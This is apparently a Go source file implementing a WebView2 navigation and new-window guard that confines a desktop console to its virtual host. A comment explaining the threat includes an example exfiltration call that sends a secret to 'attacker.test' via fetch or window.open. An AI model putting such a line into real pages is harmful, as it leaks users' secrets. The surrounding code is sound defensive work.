//go:build windows

package main

import (
	"fmt"
	"log"
	"sync"
	"unsafe"

	"github.com/wailsapp/go-webview2/pkg/edge"
	"golang.org/x/sys/windows"
)

// This file implements ADR 0018's navigation containment: the console must
// never navigate away from its own virtual host.
//
// It exists because the obvious mechanism does not work. The first attempt
// registered AddWebResourceRequestedFilter("*", ...CONTEXT_ALL) and refused
// any request whose host was not the virtual host, on the theory that the
// document request would pass through it. Running it showed the callback
// never fires at all for a virtual-host resource - not for the document, not
// for a subresource - because WebView2 resolves virtual-host mappings below
// the layer WebResourceRequested observes. That code looked exactly like a
// control and enforced nothing, which is worse than having no control at all:
// an inert guard is a guard everyone downstream believes in.
//
// The real event is NavigationStarting, and reaching it takes COM plumbing
// the Go binding does not provide. github.com/wailsapp/go-webview2 ships an
// ICoreWebView2WebResourceRequestedEventHandler but no
// ICoreWebView2NavigationStartingEventHandler and no args wrapper, so both
// are written here, mirroring the binding's own internal pattern (a vtable
// struct whose first three slots are IUnknown, built from edge.NewComProc).
//
// Two things about that are worth stating plainly rather than burying:
//
//   - The vtable layouts below are transcribed from the WebView2 IDL, and
//     slot order is load-bearing: getting one wrong calls the wrong function
//     with the wrong arguments. COM vtables are a frozen, append-only ABI
//     contract - that is what makes transcribing them safe - but it also
//     means an error here is silent rather than a compile failure, so each
//     one carries its derivation.
//
//   - Reaching AddNavigationStarting on ICoreWebView2 requires indexing the
//     vtable directly, because the binding declares that interface's vtable
//     struct unexported. That is the single unsafe step in this file, and
//     installNavigationGuard verifies the call's HRESULT rather than assuming
//     registration succeeded - see the comment there.

// navigationStartingVtblIndex is AddNavigationStarting's slot in
// ICoreWebView2's vtable, counted from the IDL:
//
//	0,1,2  IUnknown          (QueryInterface, AddRef, Release)
//	3      get_Settings
//	4      get_Source
//	5      Navigate
//	6      NavigateToString
//	7      add_NavigationStarting   <- this one
//
// The binding's own iCoreWebView2Vtbl (pkg/edge/corewebview2.go) declares the
// members in exactly this order; it is unexported, which is the only reason
// this index is written out rather than taken from the struct.
const navigationStartingVtblIndex = 7

// eventRegistrationToken mirrors WebView2's EventRegistrationToken: an opaque
// 64-bit value the caller keeps if it ever wants to unregister. This host
// registers for the process's lifetime and never removes the handler, but the
// out-parameter is not optional, so the token is stored rather than passed as
// nil.
type eventRegistrationToken struct {
	value int64
}

// ---------------------------------------------------------------------------
// ICoreWebView2NavigationStartingEventArgs
// ---------------------------------------------------------------------------

// iCoreWebView2NavigationStartingEventArgsVtbl is transcribed from the IDL
// (IID 5b495469-e119-438a-9e1d-e268d0c4ac6b), in declaration order:
//
//	get_Uri, get_IsUserInitiated, get_IsRedirected, get_RequestHeaders,
//	get_Cancel, put_Cancel, get_NavigationId
//
// Only GetUri and PutCancel are called. The rest are declared anyway, because
// a vtable struct with members omitted from the middle silently shifts every
// later slot - the members are the layout, not documentation.
type iCoreWebView2NavigationStartingEventArgsVtbl struct {
	QueryInterface     edge.ComProc
	AddRef             edge.ComProc
	Release            edge.ComProc
	GetUri             edge.ComProc
	GetIsUserInitiated edge.ComProc
	GetIsRedirected    edge.ComProc
	GetRequestHeaders  edge.ComProc
	GetCancel          edge.ComProc
	PutCancel          edge.ComProc
	GetNavigationId    edge.ComProc
}

type iCoreWebView2NavigationStartingEventArgs struct {
	vtbl *iCoreWebView2NavigationStartingEventArgsVtbl
}

// GetUri returns the URI the navigation is heading to. The string is
// allocated by WebView2 with CoTaskMemAlloc and freed here, matching the
// binding's own convention for every LPWSTR out-parameter.
func (a *iCoreWebView2NavigationStartingEventArgs) GetUri() (string, error) {
	var raw *uint16
	hr, _, _ := a.vtbl.GetUri.Call(
		uintptr(unsafe.Pointer(a)),
		uintptr(unsafe.Pointer(&raw)),
	)
	if windows.Handle(hr) != windows.S_OK {
		return "", windows.Errno(hr)
	}
	uri := windows.UTF16PtrToString(raw)
	windows.CoTaskMemFree(unsafe.Pointer(raw))
	return uri, nil
}

// PutCancel cancels (or permits) the navigation. This is the entire
// enforcement mechanism: returning from the handler without setting it lets
// the navigation proceed, so every refusal path must call this.
func (a *iCoreWebView2NavigationStartingEventArgs) PutCancel(cancel bool) error {
	var value uintptr
	if cancel {
		value = 1
	}
	hr, _, _ := a.vtbl.PutCancel.Call(uintptr(unsafe.Pointer(a)), value)
	if windows.Handle(hr) != windows.S_OK {
		return windows.Errno(hr)
	}
	return nil
}

// ---------------------------------------------------------------------------
// ICoreWebView2NavigationStartingEventHandler
// ---------------------------------------------------------------------------

type iCoreWebView2NavigationStartingEventHandlerVtbl struct {
	QueryInterface edge.ComProc
	AddRef         edge.ComProc
	Release        edge.ComProc
	Invoke         edge.ComProc
}

// navigationGuard is the COM object handed to WebView2. Its first field must
// be the vtable pointer: WebView2 receives a pointer to this struct and reads
// the first machine word as the vtable, exactly as C++ does.
type navigationGuard struct {
	vtbl *iCoreWebView2NavigationStartingEventHandlerVtbl

	// policy holds the decision and the accounting. It is a separate,
	// portable type (navigation.go) so the security-relevant logic is
	// covered by the ubuntu-latest race job rather than only by a harness
	// that needs a Windows desktop session to run at all.
	policy *navigationPolicy
}

func (g *navigationGuard) queryInterface(_ uintptr, _ uintptr) uintptr {
	// E_NOINTERFACE. WebView2 only ever holds this object through the
	// interface it was registered as, so nothing needs to be handed out.
	return 0x80004002
}

// This host owns the guard for the process's lifetime and never releases it,
// so reference counting has nothing to manage. Returning 1 from both is the
// same choice edge.Chromium makes for its own singleton callback objects.
func (g *navigationGuard) addRef() uintptr  { return 1 }
func (g *navigationGuard) release() uintptr { return 1 }

// invoke is the event itself. It fails closed in every direction: an args
// pointer it cannot read, a URI it cannot parse, and a host that is not the
// allowed one are all cancelled, so a navigation is permitted only by
// positively matching the virtual host.
func (g *navigationGuard) invoke(_ uintptr, args *iCoreWebView2NavigationStartingEventArgs) uintptr {
	if args == nil {
		// Nothing to inspect and nothing to cancel through. There is no
		// safe way to permit a navigation that cannot be identified, but
		// there is also no handle to refuse it with; S_OK is the only
		// available return. Logged because it should never happen.
		log.Printf("[WebView2] navigation starting with no event args - cannot inspect or cancel")
		return 0
	}

	uri, err := args.GetUri()
	if err != nil {
		g.refuse(args, "<unreadable>", fmt.Sprintf("the URI could not be read: %v", err))
		return 0
	}

	if g.policy.permits(uri) {
		return 0
	}
	g.refuse(args, uri, "the target is outside the console's virtual host")
	return 0
}

func (g *navigationGuard) refuse(args *iCoreWebView2NavigationStartingEventArgs, uri, why string) {
	count := g.policy.recordRefusal(uri)

	if err := args.PutCancel(true); err != nil {
		// The refusal did not take effect. This is the one failure here that
		// must never be quiet: the navigation is proceeding and the log is
		// the only record that the guard tried to stop it.
		log.Printf("[WebView2] NAVIGATION GUARD FAILED to cancel %q (%s): %v", uri, why, err)
		return
	}
	log.Printf("[WebView2] refused navigation #%d to %q: %s", count, uri, why)
}

// newNavigationGuard builds the COM object. The vtable is allocated once and
// held by the returned value, and both are kept alive by the package-level
// installedGuard below - if either were collected while WebView2 still held
// the pointer, the next navigation would call through freed memory.
func newNavigationGuard(allowedHost string) *navigationGuard {
	guard := &navigationGuard{policy: newNavigationPolicy(allowedHost)}
	guard.vtbl = &iCoreWebView2NavigationStartingEventHandlerVtbl{
		QueryInterface: edge.NewComProc(func(this *navigationGuard, refiid, object uintptr) uintptr {
			return this.queryInterface(refiid, object)
		}),
		AddRef: edge.NewComProc(func(this *navigationGuard) uintptr {
			return this.addRef()
		}),
		Release: edge.NewComProc(func(this *navigationGuard) uintptr {
			return this.release()
		}),
		Invoke: edge.NewComProc(func(this *navigationGuard, sender uintptr, args *iCoreWebView2NavigationStartingEventArgs) uintptr {
			return this.invoke(sender, args)
		}),
	}
	return guard
}

// installedGuard holds the live guard for the process's lifetime. It is a
// package-level variable specifically so the garbage collector cannot reclaim
// an object WebView2 holds a raw pointer to, and so the harness can read the
// refusal count.
var (
	installOnce    sync.Once
	installedGuard *navigationGuard
	installErr     error
)

// installNavigationGuard registers the guard on the given ICoreWebView2. It
// is safe to call repeatedly - only the first call registers - because the
// only place a *ICoreWebView2 is reachable from outside the binding is a
// callback's sender argument, and those fire more than once.
//
// The HRESULT is checked rather than discarded. A guard that failed to
// register looks exactly like a guard that registered and was never needed:
// both are silent, and both leave the console unprotected. This is the same
// class of mistake as the inert WebResourceRequested filter this file
// replaces, so the return value is propagated to the caller, which logs it
// loudly.
func installNavigationGuard(webview *edge.ICoreWebView2, allowedHost string) error {
	installOnce.Do(func() {
		if webview == nil {
			installErr = fmt.Errorf("navigation guard: no ICoreWebView2 to register on")
			return
		}

		guard := newNavigationGuard(allowedHost)

		// The one unsafe step, and the reason it is unavoidable: the binding
		// declares ICoreWebView2's vtable struct unexported, so
		// AddNavigationStarting cannot be named from this package. The
		// interface pointer's first machine word is the vtable pointer (COM's
		// ABI, not the binding's choice), and the slot index is fixed by the
		// IDL - see navigationStartingVtblIndex above.
		vtbl := *(**[navigationStartingVtblIndex + 1]uintptr)(unsafe.Pointer(webview))
		addNavigationStarting := edge.ComProc(vtbl[navigationStartingVtblIndex])

		var token eventRegistrationToken
		hr, _, _ := addNavigationStarting.Call(
			uintptr(unsafe.Pointer(webview)),
			uintptr(unsafe.Pointer(guard)),
			uintptr(unsafe.Pointer(&token)),
		)
		if windows.Handle(hr) != windows.S_OK {
			installErr = fmt.Errorf("navigation guard: add_NavigationStarting returned %w", windows.Errno(hr))
			return
		}

		installedGuard = guard

		// Installed together, deliberately. NavigationStarting governs where
		// this window may go; NewWindowRequested governs whether a second
		// window may exist. Installing one without the other leaves an egress
		// channel open while the log reports a guard installed - the exact
		// false-confidence shape the inert WebResourceRequested filter had.
		if werr := installNewWindowGuard(webview, guard.policy); werr != nil {
			installErr = werr
			return
		}

		log.Printf("[WebView2] navigation guard installed: only https://%s is reachable", allowedHost)
	})
	return installErr
}

// navigationGuardStats reports the installed guard's counters, or zero if no
// guard was ever installed. The bool distinguishes "installed and never
// needed" from "never installed", which the harness must be able to tell
// apart.
func navigationGuardStats() (installed bool, refusals int, lastURI string) {
	if installedGuard == nil {
		return false, 0, ""
	}
	refusals, lastURI = installedGuard.policy.Stats()
	return true, refusals, lastURI
}

// newWindowGuardStats reports the new-window refusals, kept distinct from the
// navigation ones so the harness can tell which hole a run actually exercised.
func newWindowGuardStats() (installed bool, refusals int, lastURI string) {
	if installedWindowGuard == nil {
		return false, 0, ""
	}
	refusals, lastURI = installedWindowGuard.policy.WindowStats()
	return true, refusals, lastURI
}

// ---------------------------------------------------------------------------
// ICoreWebView2NewWindowRequestedEventArgs / handler
//
// A second hole, closed for a different reason than the first. The navigation
// guard above governs where THIS window may go. It does not fire for
// window.open or for a link with target=_blank: those raise
// NewWindowRequested, a separate event, and refusing a navigation says
// nothing about whether a second window may be created.
//
// The Content-Security-Policy does not close it either, and it is worth being
// precise about why, because "connect-src 'none'" reads like it should. CSP
// governs what a document may fetch, embed and execute. Opening a window is
// none of those. A compromised page cannot fetch("https://attacker.test?x=" +
// secret), but it can window.open the same URL, and the data leaves in the
// request line just the same. Only the host can refuse that.
//
// Refusing every new window is the whole policy - not an allowlist like the
// navigation guard's. This console is a single operator surface with no
// external links and no second window of its own; there is no case in which
// opening one is correct, so there is nothing to allow.
// ---------------------------------------------------------------------------

// newWindowRequestedVtblIndex is add_NewWindowRequested's slot in
// ICoreWebView2's vtable. Counted from the binding's own iCoreWebView2Vtbl
// (pkg/edge/corewebview2.go), whose members are in IDL order; the same count
// puts add_NavigationStarting at 7, which independently confirms the reading
// against the constant above.
const newWindowRequestedVtblIndex = 44

// iCoreWebView2NewWindowRequestedEventArgsVtbl is transcribed from the IDL
// (IID 34acb11c-fc37-4418-9132-f9c21d1eafb9) in declaration order:
//
//	get_Uri, put_NewWindow, get_NewWindow, put_Handled, get_Handled,
//	get_IsUserInitiated, GetDeferral, get_WindowFeatures
//
// Only GetUri and PutHandled are called; the rest are declared because
// omitting a member from the middle silently shifts every later slot.
type iCoreWebView2NewWindowRequestedEventArgsVtbl struct {
	QueryInterface     edge.ComProc
	AddRef             edge.ComProc
	Release            edge.ComProc
	GetUri             edge.ComProc
	PutNewWindow       edge.ComProc
	GetNewWindow       edge.ComProc
	PutHandled         edge.ComProc
	GetHandled         edge.ComProc
	GetIsUserInitiated edge.ComProc
	GetDeferral        edge.ComProc
	GetWindowFeatures  edge.ComProc
}

type iCoreWebView2NewWindowRequestedEventArgs struct {
	vtbl *iCoreWebView2NewWindowRequestedEventArgsVtbl
}

func (a *iCoreWebView2NewWindowRequestedEventArgs) GetUri() (string, error) {
	var raw *uint16
	hr, _, _ := a.vtbl.GetUri.Call(uintptr(unsafe.Pointer(a)), uintptr(unsafe.Pointer(&raw)))
	if windows.Handle(hr) != windows.S_OK {
		return "", windows.Errno(hr)
	}
	uri := windows.UTF16PtrToString(raw)
	windows.CoTaskMemFree(unsafe.Pointer(raw))
	return uri, nil
}

// PutHandled marks the request as dealt with. Setting it true WITHOUT ever
// calling put_NewWindow is what refuses the window: WebView2 takes "handled,
// and no window supplied" to mean the host declined, and opens nothing.
// Leaving it false would let WebView2 fall back to its default, which is to
// open the window.
func (a *iCoreWebView2NewWindowRequestedEventArgs) PutHandled(handled bool) error {
	var value uintptr
	if handled {
		value = 1
	}
	hr, _, _ := a.vtbl.PutHandled.Call(uintptr(unsafe.Pointer(a)), value)
	if windows.Handle(hr) != windows.S_OK {
		return windows.Errno(hr)
	}
	return nil
}

type iCoreWebView2NewWindowRequestedEventHandlerVtbl struct {
	QueryInterface edge.ComProc
	AddRef         edge.ComProc
	Release        edge.ComProc
	Invoke         edge.ComProc
}

type newWindowGuard struct {
	vtbl   *iCoreWebView2NewWindowRequestedEventHandlerVtbl
	policy *navigationPolicy
}

func (g *newWindowGuard) queryInterface(_ uintptr, _ uintptr) uintptr { return 0x80004002 }
func (g *newWindowGuard) addRef() uintptr                             { return 1 }
func (g *newWindowGuard) release() uintptr                            { return 1 }

// invoke refuses unconditionally. A URI it cannot read is still refused - the
// refusal does not depend on identifying the target, only on there being one.
func (g *newWindowGuard) invoke(_ uintptr, args *iCoreWebView2NewWindowRequestedEventArgs) uintptr {
	if args == nil {
		log.Printf("[WebView2] new window requested with no event args - cannot refuse it")
		return 0
	}
	uri, err := args.GetUri()
	if err != nil {
		uri = "<unreadable>"
	}
	count := g.policy.recordWindowRefusal(uri)
	if putErr := args.PutHandled(true); putErr != nil {
		log.Printf("[WebView2] NEW-WINDOW GUARD FAILED to refuse %q: %v", uri, putErr)
		return 0
	}
	log.Printf("[WebView2] refused new window #%d to %q", count, uri)
	return 0
}

func newNewWindowGuard(policy *navigationPolicy) *newWindowGuard {
	guard := &newWindowGuard{policy: policy}
	guard.vtbl = &iCoreWebView2NewWindowRequestedEventHandlerVtbl{
		QueryInterface: edge.NewComProc(func(this *newWindowGuard, refiid, object uintptr) uintptr {
			return this.queryInterface(refiid, object)
		}),
		AddRef:  edge.NewComProc(func(this *newWindowGuard) uintptr { return this.addRef() }),
		Release: edge.NewComProc(func(this *newWindowGuard) uintptr { return this.release() }),
		Invoke: edge.NewComProc(func(this *newWindowGuard, sender uintptr, args *iCoreWebView2NewWindowRequestedEventArgs) uintptr {
			return this.invoke(sender, args)
		}),
	}
	return guard
}

var installedWindowGuard *newWindowGuard

// installNewWindowGuard registers the refusal on the same ICoreWebView2 the
// navigation guard uses, sharing its policy object so both counters live in
// one place. Called from installNavigationGuard so the two cannot drift apart:
// installing one without the other leaves an egress channel open while the log
// says a guard is installed.
func installNewWindowGuard(webview *edge.ICoreWebView2, policy *navigationPolicy) error {
	vtbl := *(**[newWindowRequestedVtblIndex + 1]uintptr)(unsafe.Pointer(webview))
	addNewWindowRequested := edge.ComProc(vtbl[newWindowRequestedVtblIndex])

	guard := newNewWindowGuard(policy)
	var token eventRegistrationToken
	hr, _, _ := addNewWindowRequested.Call(
		uintptr(unsafe.Pointer(webview)),
		uintptr(unsafe.Pointer(guard)),
		uintptr(unsafe.Pointer(&token)),
	)
	if windows.Handle(hr) != windows.S_OK {
		return fmt.Errorf("new-window guard: add_NewWindowRequested returned %w", windows.Errno(hr))
	}
	installedWindowGuard = guard
	log.Printf("[WebView2] new-window guard installed: no second window may be opened")
	return nil
}
